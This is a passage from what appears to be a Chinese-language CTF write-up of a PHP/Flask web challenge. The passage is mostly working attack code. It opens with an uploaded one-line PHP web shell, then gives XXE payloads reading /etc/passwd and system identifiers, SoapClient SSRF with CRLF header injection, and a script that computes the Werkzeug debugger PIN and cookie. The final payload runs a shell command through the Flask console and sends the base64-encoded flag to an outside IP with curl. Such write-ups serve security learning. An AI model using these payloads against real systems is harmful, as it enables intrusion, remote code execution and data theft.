+Content-Type: application/octet-stream
+
+&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;
+------WebKitFormBoundarymEq0o60RkRmbFHie--
+</code></pre><p>拿到源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Session not started&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>    $type <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;type&#39;</span>];
+</span></span><span style="display:flex;"><span>    $properties <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;properties&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>($_POST[<span style="color:#e6db74">&#39;data&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">extract</span>(<span style="color:#a6e22e">unserialize</span>($_POST[<span style="color:#e6db74">&#39;data&#39;</span>]));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_string</span>($properties)<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($properties))){
+</span></span><span style="display:flex;"><span>    $object <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($properties));
+</span></span><span style="display:flex;"><span>    $object <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">sctf</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_array</span>($properties)){
+</span></span><span style="display:flex;"><span>        $object <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $type($properties[<span style="color:#ae81ff">0</span>],$properties[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $object <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;http://127.0.0.1:5000/&#39;</span><span style="color:#f92672">.</span>$properties);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;this is the object: </span><span style="color:#e6db74">$object</span><span style="color:#e6db74"> &lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>这里有个 extract就很灵性，可以覆盖$type和$properties</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">new</span> $type($properties[<span style="color:#ae81ff">0</span>],$properties[<span style="color:#ae81ff">1</span>])
+</span></span></code></pre></div><p>这里明显可以使用原生类进行操作 读文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$class <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;SimpleXMLElement&#39;</span>;
+</span></span><span style="display:flex;"><span>$evilxml <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>$arr <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;properties&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>($evilxml, <span style="color:#e6db74">&#39;2&#39;</span>),<span style="color:#e6db74">&#39;type&#39;</span><span style="color:#f92672">=&gt;</span>$class);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($arr);
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101610360.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101610360.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101610360.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101610360.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101610360.png"
+        title="image-20230710161002293" /></p>
+<p>根据题意去读/app/app.py结果 拿到这个</p>
+<p>开启了debug ， 理论上可以算pin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_string</span>($properties)<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($properties))){
+</span></span><span style="display:flex;"><span>    $object <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($properties));
+</span></span><span style="display:flex;"><span>    $object <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">sctf</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>();
+</span></span></code></pre></div><p>这里调用sctf()会触发_call_类，有个SoapClient 打 ssrf + crlf 组合拳的姿势 <a href="https://bycsec.top/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener noreffer">https://bycsec.top/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/</a>
+</p>
+<p>关于原理呢，先了解一下SoapClient类</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">SoapClient</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">SoapClient</span> <span style="color:#a6e22e">（mixed</span> $wsdl [<span style="color:#a6e22e">，array</span> $options ]<span style="color:#a6e22e">）</span>
+</span></span></code></pre></div><p>第一个参数是用来指明是否是wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。</p>
+<p>我们可以设置第一个参数为<code>null</code>，然后第二个参数的<code>location</code>选项设置为<code>target_url</code>，如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SoapClient</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://127.0.0.1/&#34;</span>, <span style="color:#e6db74">&#39;uri&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;123&#34;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>这里有趣的地方就在于两点</p>
+<ul>
+<li>SoapClient是php的原生类。且它有一个<code>__call()</code>魔术方法 ==&gt; 调用__call()后就可以访问location达成ssrf</li>
+<li>SoapClient的第二个参数允许我们自定义User-Agent  ==&gt; 自定义user-agent 可以实现crlf 注入</li>
+</ul>
+<p>CRLF与SSRF，这两个漏洞都可以通过SoapClient达成</p>
+<p>本题</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;properties&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SoapClient</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;user_agent&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;thnpkm</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Cookie: name=123&#34;</span>,
+</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;http://47.100.196.3:4444/&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;uri&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;123&#39;</span>
+</span></span><span style="display:flex;"><span>    )))));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span>($a);
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>可以实现CRLF  和 SSRF</p>
+<p>现在就是要算pin 和 cookie了</p>
+<p>本地起一个flask服务看一下格式，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101744573.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101744573.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101744573.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101744573.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101744573.png"
+        title="image-20230710174449522" /></p>
+<pre tabindex="0"><code>Cookie: cookieName=时间戳|hash签名
+</code></pre><p>这里的s参数直接访问/console就能拿到</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101746266.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101746266.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101746266.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101746266.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202307101746266.png"
+        title="image-20230710174612222" /></p>
+<p>本题通过<code>$object = file_get_contents('http://127.0.0.1:5000/'.$properties);</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$arr <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;properties&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;console&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($arr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;properties&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;console&#34;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">获得</span> <span style="color:#a6e22e">SECRET：ECDJpSJ4XJ5AZJtaxMHT</span>
+</span></span></code></pre></div><p>现在有算pin的脚本，因为文件我们可读，所以算pin码的数据都可以拿到。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;properties&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">114</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;?xml version=&#34;</span><span style="color:#ae81ff">1.0</span><span style="color:#e6db74">&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;</span><span style="color:#a6e22e">file</span><span style="color:#f92672">:///</span><span style="color:#a6e22e">sys</span><span style="color:#f92672">/</span><span style="color:#a6e22e">class</span><span style="color:#f92672">/</span><span style="color:#a6e22e">net</span><span style="color:#f92672">/</span><span style="color:#a6e22e">eth0</span><span style="color:#f92672">/</span><span style="color:#a6e22e">address</span><span style="color:#e6db74">&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;2&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;type&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;SimpleXMLElement&#34;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">42</span><span style="color:#f92672">:</span><span style="color:#a6e22e">ac</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#f92672">-&gt;</span> <span style="color:#ae81ff">2485378023426</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;properties&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">118</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;?xml version=&#34;</span><span style="color:#ae81ff">1.0</span><span style="color:#e6db74">&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;</span><span style="color:#a6e22e">file</span><span style="color:#f92672">:///</span><span style="color:#a6e22e">proc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sys</span><span style="color:#f92672">/</span><span style="color:#a6e22e">kernel</span><span style="color:#f92672">/</span><span style="color:#a6e22e">random</span><span style="color:#f92672">/</span><span style="color:#a6e22e">boot_id</span><span style="color:#e6db74">&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;2&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;type&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;SimpleXMLElement&#34;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">349</span><span style="color:#a6e22e">b3354</span><span style="color:#f92672">-</span><span style="color:#a6e22e">f67f</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4438</span><span style="color:#f92672">-</span><span style="color:#a6e22e">b395</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#a6e22e">fbc01171fdd</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;properties&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">104</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;?xml version=&#34;</span><span style="color:#ae81ff">1.0</span><span style="color:#e6db74">&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;</span><span style="color:#a6e22e">file</span><span style="color:#f92672">:///</span><span style="color:#a6e22e">proc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">self</span><span style="color:#f92672">/</span><span style="color:#a6e22e">cgroup</span><span style="color:#e6db74">&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;2&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;type&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;SimpleXMLElement&#34;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">96</span><span style="color:#a6e22e">f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span>
+</span></span></code></pre></div><p>至于这个python版本到底是啥，可以去读一下下<code>/usr/lib/python3.8/LICENSE.txt</code> 发现正是python3.8</p>
+<p>现在是如何伪造cookie的问题了，这个需要去翻源码去了</p>
+<p>和通常3.8的算pin脚本结合一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#sha1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;app&#39;</span><span style="color:#75715e"># /etc/passwd</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flask.app&#39;</span>,<span style="color:#75715e"># 默认值</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Flask&#39;</span>,<span style="color:#75715e"># 默认值</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/usr/lib/python3.8/site-packages/flask/app.py&#39;</span> <span style="color:#75715e"># 报错得到</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;2485378023426&#39;</span>,<span style="color:#75715e">#  /sys/class/net/eth0/address 16进制转10进制</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&#39;</span><span style="color:#75715e"># 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(bit, str):
+</span></span><span style="display:flex;"><span>        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(bit)
+</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cookiesalt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__wzd&#39;</span> <span style="color:#f92672">+</span> h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pinsalt&#39;</span>)
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">.</span>join(num[x:x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>                          <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> num
+</span></span><span style="display:flex;"><span>print(hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>rv<span style="color:#e6db74">}</span><span style="color:#e6db74"> added salt&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>))<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">12</span>]) <span style="color:#75715e">#hash签名</span>
+</span></span><span style="display:flex;"><span>print(cookie_name) <span style="color:#75715e"># 	cookiename</span>
+</span></span><span style="display:flex;"><span>print(rv) <span style="color:#75715e"># PIN</span>
+</span></span></code></pre></div><pre tabindex="0"><code>11b8517fb9fb
+__wzdb2a60e2b19822632a67c
+121-260-582
+</code></pre><p>cookie的组成 ：Cookie: cookieName=时间戳|hash签名</p>
+<p>这里的时间戳值倒是不重要</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SoapClient</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%27os%27).popen(%27curl%2047.100.196.3%3A4444/?a=`curl%20file:///flag|base64`%27)&amp;frm=0&amp;s=ECDJpSJ4XJ5AZJtaxMHT	&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;user_agent&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;aaa</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;Cookie: __wzdb2a60e2b19822632a67c=1687115222|11b8517fb9fb</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;uri&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://127.0.0.1:5000&#34;</span>));
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;awd&#34;</span>,<span style="color:#e6db74">&#34;properties&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($a)));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> (<span style="color:#a6e22e">serialize</span>($b));
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200922642.png"
